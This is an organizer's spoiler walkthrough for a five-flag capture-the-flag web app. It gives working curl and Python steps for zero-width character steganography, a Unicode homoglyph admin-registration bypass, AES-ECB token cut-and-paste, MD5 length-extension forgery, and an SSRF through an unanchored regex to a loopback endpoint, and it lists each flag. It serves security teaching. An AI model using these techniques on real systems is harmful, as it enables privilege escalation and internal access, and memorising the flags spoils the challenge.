# Solution walkthrough (organizer — SPOILERS)

`scripts/solve.py` does all of this (pure stdlib). Set `B` to your app.

## Flag 1 — zero-width stego

The landing page weaves the flag into the text as zero-width characters
(`U+200B`=0, `U+200C`=1):
```python
html = urlopen(B).read().decode("utf-8")
bits = "".join("0" if c=="​" else "1" for c in html if c in "​‌")
print(bytes(int(bits[i:i+8],2) for i in range(0,len(bits),8)))
```
→ **`BAS{z3r0_w1dth_chars_h1d1ng_1n_pl41n_s1ght}`**

## Flag 2 — NFKC vs `lower()`

Registration blocks `name.lower() in {"admin","root"}`, but grants admin when
`NFKC(name).lower()` is reserved. `"ᴬ"` (U+1D2C) lowercases to itself (so the block
misses it) and NFKC-folds to `A`:
```bash
curl -s "$B/api/register" -H 'Content-Type: application/json' --data-binary $'{"name":"ᴬdmin"}'
```
→ **`BAS{nfkc_n0rm4liz4t10n_h0m0glyph_4dm1n}`**

## Flag 3 — AES-ECB cut-and-paste (Cryptopals 13)

The token encrypts `name=<you>&role=user` in ECB. Block size 16, prefix `name=` is
5 bytes.

1. Register `name = "A"*11 + "admin" + "\x0b"*11`. Plaintext blocks become
   `name=AAAAAAAAAAA | admin\x0b…\x0b | &role=user…`. **Block 1** is a ready-made
   `admin` + PKCS#7 padding block — save that ciphertext block.
2. Register `name = "BBBBB"` so the plaintext is `name=BBBBB&role= | user…`.
3. Forge `token = ct_block0(step 2) ‖ ct_block1(step 1)`. It decrypts to
   `name=BBBBB&role=admin`.
```bash
curl -s "$B/vault?token=<forged b64>"
```
→ **`BAS{ecb_cut_4nd_p4st3_bl0ck_shuffl3}`**

## Flag 4 — MD5 length extension

`GET /api/report` reveals `sig = md5(secret ‖ data)` and gives a valid pair. For
each candidate secret length, compute the MD5 padding of `secret‖data`, append it
plus `&admin=1`, and continue the hash from the known digest:
```python
glue = md5pad(klen + len(data0))
forged_data = data0 + glue + b"&admin=1"
forged_sig  = md5_continue(sig0, b"&admin=1", prior_len=klen+len(data0)+len(glue))
curl "$B/api/report?data=<forged_data hex>&sig=<forged_sig>"   # klen=16 works
```
→ **`BAS{md5_l3ngth_3xt3ns10n_f0rg3d_s1gn4tur3}`** (solver hand-rolls MD5; no hashpump needed).

## Flag 5 — unanchored regex SSRF

`/api/preview` allows a URL if `re.search(r"bastion\.internal", url)` — a substring
match *anywhere*. The app's own diagnostics note points at
`http://127.0.0.1/_internal/*`, which is served only to loopback. Smuggle it past
the check by appending the magic substring:
```bash
curl -s "$B/api/preview?url=http://127.0.0.1/_internal/flag?x=bastion.internal"
```
→ **`BAS{un4nch0r3d_r3g3x_ssrf_t0_l0c4lh0st}`**

---

**Takeaway:** every one of these is a *recognition* problem. The exploit is short;
the skill is noticing invisible characters, a block-aligned ciphertext, a
secret-prefixed hash, and a regex missing its anchors.
